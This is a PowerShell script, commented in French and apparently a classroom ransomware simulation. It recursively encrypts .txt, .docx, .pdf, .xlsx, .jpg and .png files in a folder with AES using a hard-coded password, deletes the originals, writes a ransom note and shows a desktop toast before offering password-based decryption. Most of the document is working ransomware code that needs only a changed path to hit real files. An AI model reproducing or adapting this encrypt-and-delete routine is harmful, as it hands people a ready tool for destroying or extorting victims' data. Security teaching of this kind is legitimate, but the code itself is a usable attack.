$password = "TP2026"
$folder = "D:\Desktop\tp-simulation"

$sha = New-Object System.Security.Cryptography.SHA256Managed
$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))

# --- CHIFFREMENT ---
$files = Get-ChildItem $folder -File -Include "*.txt","*.docx","*.pdf","*.xlsx","*.jpg","*.png" -Recurse

foreach ($file in $files)
{
    $data = [System.IO.File]::ReadAllBytes($file.FullName)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    $result = $aes.IV + $encryptedData
    $outputFile = $file.FullName + ".locked"
    [System.IO.File]::WriteAllBytes($outputFile, $result)
    Remove-Item $file.FullName -Force
    Write-Host "Chiffre :" $file.Name
}

# --- NOTE DE RANSON ---
$ransom = @"
==========================================================
==========================================================
            VOS FICHIERS ONT ETE CHIFFRES
==========================================================

Tous vos fichiers .txt ont ete chiffres avec AES-256.
Les fichiers originaux ont ete supprimes.

Pour recuperer vos fichiers, vous devez entrer le mot de passe.

Lancez le script de dechiffrement et entrez le mot de passe.

----------------------------------------------------------
  CECI EST UNE SIMULATION - ENVIRONNEMENT DE FORMATION
----------------------------------------------------------
"@
$utf8Bom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
Write-Host "Note de rancon creee : README_DECRYPT.txt"

# --- NOTIFICATION TOAST ---
# --- NOTIFICATION TOAST ---
[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null

$toastXml = @"
<toast>
  <visual>
    <binding template="ToastText02">
      <text id="1">FICHIERS CHIFFRES</text>
      <text id="2">Vos fichiers ont ete chiffres. Lisez README_DECRYPT.txt</text>
    </binding>
  </visual>
</toast>
"@

$xml = [Windows.Data.Xml.Dom.XmlDocument]::new()
$xml.LoadXml($toastXml)

$toast = [Windows.UI.Notifications.ToastNotification]::new($xml)
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\WindowsPowerShell\v1.0\powershell.exe").Show($toast)

Write-Host ""
Write-Host "Tous les fichiers sont chiffres."
Write-Host ""

# --- DEMANDE MOT DE PASSE ---
$userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"

if ($userPassword -ne $password)
{
    Write-Host "Mot de passe incorrect."
    exit
}

# --- DECHIFFREMENT ---
$encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked"

foreach ($encFile in $encryptedFiles)
{
    $data = [System.IO.File]::ReadAllBytes($encFile.FullName)
    $iv = $data[0..15]
    $encryptedData = $data[16..($data.Length - 1)]
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
    $originalName = $encFile.FullName -replace '\.locked$', ''
    [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
    Remove-Item $encFile.FullName -Force
    Write-Host "Dechiffre :" $originalName
}

# --- NETTOYAGE ---
Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Tous les fichiers ont ete dechiffres et restaures."